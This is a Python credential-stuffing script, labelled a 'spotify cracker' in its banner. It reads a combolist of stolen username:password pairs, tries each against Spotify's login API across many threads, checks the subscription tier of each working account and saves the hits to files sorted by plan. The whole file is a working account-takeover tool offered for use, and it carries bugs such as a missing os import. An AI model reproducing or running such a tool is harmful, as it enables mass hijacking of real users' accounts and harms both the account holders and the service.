import sys,threading,time,socket
from tkinter.filedialog import askopenfilename
from tkinter import Tk
try:
    import requests
except:
    os.system("pip install requests")
try:
    import requests
except:
    print("failed to install python requests\ntry installing that manually")
    sys.exit()

LOGIN_API_URL = "https://accounts.spotify.com/api/login"
MAIN_URL = "https://accounts.spotify.com/api/login"
BUFFER_SIZE = 20*1024*1024
BAD_COUNT = 0
GOOD_PREMIUM = []
GOOD_FAMILY_OWNER = []
GOOD_FAMILY_MEMBER = []
GOOD_FREE = []
UNK = []
FILE_NAME_PREFIX = time.ctime().split()[2] + time.ctime().split()[3].replace(":",".") + time.ctime().split()[4]
SAVE_DATA_PORT=65534
DO_NOT_PRINT = False


def savedata(plan,data):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(("127.0.0.1",SAVE_DATA_PORT))
    save_data = plan + ">>" + data
    save_data = save_data.encode()
    sock.send(save_data)
    response = sock.recv(256)
    return



def savemanager():
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind(("127.0.0.1",SAVE_DATA_PORT))
    sock.listen()
    FILE_HITS_FREE = FILE_NAME_PREFIX + "_FREE.txt"
    FILE_HITS_PREMIUM = FILE_NAME_PREFIX + "_PREMIUM.txt"
    FILE_HITS_OWNER = FILE_NAME_PREFIX + "_OWNER.txt"
    FILE_HITS_MEMBER = FILE_NAME_PREFIX + "_MEMBER.txt"
    FILE_HITS_UNK = FILE_NAME_PREFIX + "_UNK.txt"
    while True:
        client , _ = sock.accept()
        data = client.recv(2048) #TODO implement fetch function
        data = data.decode()
        plan , login_data = data.split(">>")
        if plan == "free":
            temp_file = open(FILE_HITS_FREE,"a+")
            temp_file.write(login_data + "\n")
        elif plan == "premium":
            temp_file = open(FILE_HITS_PREMIUM,"a+")
            temp_file.write(login_data + "\n")
        elif plan == "owner":
            temp_file = open(FILE_HITS_OWNER,"a+")
            temp_file.write(login_data + "\n")
        elif plan == "member":
            temp_file = open(FILE_HITS_MEMBER,"a+")
            temp_file.write(login_data + "\n")
        elif plan == "unk":
            temp_file = open(FILE_HITS_UNK,"a+")
            temp_file.write(login_data + "\n")
        client.close()
        temp_file.close()
        



def check_account(username,password):
    session = requests.session()
    try:
        session.get("https://accounts.spotify.com/en/login/")
    except Exception as e:
        check_account(username,password)
    login_params = {'remember':'true',
        'username':username,
        'password':password,
        'csrf_token':session.cookies.get("csrf_token")}
    session.cookies["__bon"] = "MHwwfDM1Nzg1NzU3OHwxNTAzMDAxODI3NnwxfDF8MXwx"
    session.cookies["fb_continue"] = "https%3A%2F%2Faccounts.spotify.com%2Fen%2Fstatus"
    session.cookies["remember"] = login_params.get("username")
    try:
        resp = session.post(LOGIN_API_URL, data=login_params)
    except Exception as e:
        check_account(username,password)


    if not resp:
        check_account(username,password)
            #I've no clue why but sometimes we run the following
            #lines and resp variable is not set yet. The previous
            #condition is there to make sure that resp variable is
            #set before calling it
    if resp.status_code==200:
        return [0,session]
    elif resp.status_code==400:
        return [-1,None]
    else:
        return [-2,resp]

def check_info(login_session):
    resp = login_session.get("https://www.spotify.com/us/account/subscription/")
    if resp.text.count("Spotify Free"):
        return "free"
    elif resp.text.count("You're a member of a family plan"):
        return "familyMember"
    elif resp.text.count("Premium for Family"):
        return "familyOwner"
    elif resp.text.count("Spotify Premium"):
        return "premium"
    else:
        return resp

def Intro():
    print("""
      _                 _                        _   _  __                             _             
     (_)               | |                      | | (_)/ _|                           | |            
  ___ _ _ __ ___  _ __ | | ___   ___ _ __   ___ | |_ _| |_ _   _    ___ _ __ __ _  ___| | _____ _ __ 
 / __| | '_ ` _ \| '_ \| |/ _ \ / __| '_ \ / _ \| __| |  _| | | |  / __| '__/ _` |/ __| |/ / _ \ '__|
 \__ \ | | | | | | |_) | |  __/ \__ \ |_) | (_) | |_| | | | |_| | | (__| | | (_| | (__|   <  __/ |   
 |___/_|_| |_| |_| .__/|_|\___| |___/ .__/ \___/ \__|_|_|  \__, |  \___|_|  \__,_|\___|_|\_\___|_|   
                 | |                | |                     __/ |                                    
                 |_|                |_|                    |___/                                     
""")

def ask_threads():
    print("How many threads?(default is 10)",end='')
    try:
        return int(input())
    except:
        return 10

def ask_combo():
    Tk().withdraw()
    filename =  askopenfilename(initialdir = "/",title = "Select the Combolist",filetypes = (("Text Document","*.txt"),("all files","*.*")))
    return filename
def divide_combo(combofile,num):
    #if os.path.getsize(combofile)<BUFFER:
    if True:
        combo = open(combofile).read().split("\n")
        min_combo_size = int(len(combo)/num)
        final = list()
        for i in range(num):
            final.append([])
            final[i] = combo[:min_combo_size]
            combo = combo[min_combo_size:]
        if len(combo)==0:
            return final
        else:
            for i in range(len(combo)):
                final[i].append(combo[i])
            return final

    else:
        pass
        #TODO find a method for loading large files

def threadhandler(combo):
    for data in combo:
        user , password = data[:data.find(":")],data[data.find(":")+1:]  
        stat,session = check_account(user,password)
        if stat==-1:
            global BAD_COUNT 
            BAD_COUNT += 1
            continue
        elif stat==0:
            plan = check_info(session)
            if "str" in str(type(plan)):
                if plan=="free":
                    global GOOD_FREE
                    GOOD_FREE.append(data)
                    savedata("free",data)
                    continue
                elif plan=="premium":
                    global GOOD_PREMIUM
                    GOOD_PREMIUM.append(data)
                    savedata("premium",data)
                    continue
                elif plan=="familyOwner":
                    global GOOD_FAMILY_OWNER
                    GOOD_FAMILY_OWNER.append(data)
                    savedata("owner",data)
                    continue
                elif plan=="familyMember":
                    global GOOD_FAMILY_MEMBER
                    GOOD_FAMILY_MEMBER.append(data)
                    savedata("member",data)
                    continue
                else:
                    global UNK
                    UNK.append(data)
                    savedata("unk",data)
                    continue
                    

def Board(refresh_rate=1/5):
    while True:
        bad = BAD_COUNT
        premium = len(GOOD_PREMIUM)
        owner = len(GOOD_FAMILY_OWNER)
        member = len(GOOD_FAMILY_MEMBER)
        free = len(GOOD_FREE)
        unk = len(UNK)
        if not DO_NOT_PRINT:
            print("bad:{}/premium:{}/owner:{}/member:{}/free:{}/unk:{}\n".format(bad,premium,owner,member,free,unk) , end='\r')
        time.sleep(1/refresh_rate)
    

if __name__=="__main__":
    Intro()
    threads = ask_threads()
    combo = ask_combo()
    combo = divide_combo(combo, threads)
    threading._start_new_thread(savemanager,tuple())
    threading._start_new_thread(Board,tuple())
    for number in range(threads):
        threading._start_new_thread(threadhandler,tuple([combo[number]]))
    while True:
        try:
            pass
        except KeyboardInterrupt:
            DO_NOT_PRINT = 1
            if input("Exiting?(y/n)\t").lower()=="y":
                sys.exit()
            else:
                DO_NOT_PRINT = 0
                continue

